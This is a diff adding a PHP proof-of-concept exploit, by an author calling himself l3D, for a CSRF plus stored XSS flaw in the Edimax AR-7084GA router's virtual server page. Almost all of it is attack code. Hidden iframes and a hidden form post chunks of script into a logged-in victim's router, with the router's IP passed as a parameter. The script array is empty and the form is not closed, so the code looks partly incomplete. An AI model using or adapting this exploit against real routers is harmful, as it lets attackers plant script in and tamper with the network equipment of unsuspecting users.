@@ -1,0 +1,59 @@
+<?php
+/*
+Edimax AR-7084GA Router CSRF + Persistent XSS Exploit
+Firmware version: 2.9.8.1(RUE0.C2A)3.7.6.1
+Vulnerable page: http://[xx.xx.xx.xx]/advanced/adv_nat_virsvr.htm
+Author: l3D
+Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
+IRC: irc://irc.nix.co.il
+Email: pupipup33@gmail.com
+
+Like every CSRF attack, the victim must be logged in first before he
+opens this malicious page.
+Then he should wait some seconds until the router receives all the requests.
+It may take few tries until it works.
+The code should be split into parts because the router limits the
+VIRTUALSVR_Application parameter length.
+The author doesn't take any responsibility for what you do with that code.
+*/
+if(!isset($_GET["ip"]) or !is_string($_GET["ip"])) die("The victim
+router's ip isn't set!");
+else $ip=$_GET["ip"];
+
+if(!isset($_GET["time"])){
+	$script=Array(
+					''
+	);
+	foreach($script as $part)
+		if(strlen($part)>25) die("One or more of the parts can't be longer
+then 25 characters!");
+	$url="http://".$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+	for($i=1; $i<=count($script); $i++){
+		$target=$url."&time=".$i."&script=".urlencode($script[$i-1]);
+		echo '<iframe src="'.$target.'" height="0" width="0"></iframe>';
+	}
+	die();
+}
+else{
+	$time=$_GET["time"];
+	$script=$_GET["script"];
+}
+?>
+<html>
+	<head>
+		
+	</head>
+	<body>
+		<form method="post" action="http://<?php echo $ip;
+?>/Forms/adv_nat_virsvr_1" name="VIRTUALSVR_form">
+			<input type="hidden" name="VIRTUALSVR_IndexFlag" value="0" />
+			<input type="hidden" name="VIRTUALSVR_index" value="<?php echo $time; ?>" />
+			<input type="hidden" name="VIRTUALSVR_Application" value="<?php
+echo htmlspecialchars($script); ?>" />
+			<input type="hidden" name="VIRTUALSVR_startPort" value="<?php echo
+$time; ?>" />
+			<input type="hidden" name="VIRTUALSVR_endPort" value="<?php echo
+$time; ?>" />
+			<input type="hidden" name="VIRTUALSVR_localIP" value="<?php echo $ip; ?>" />
+	</body>
+</html>
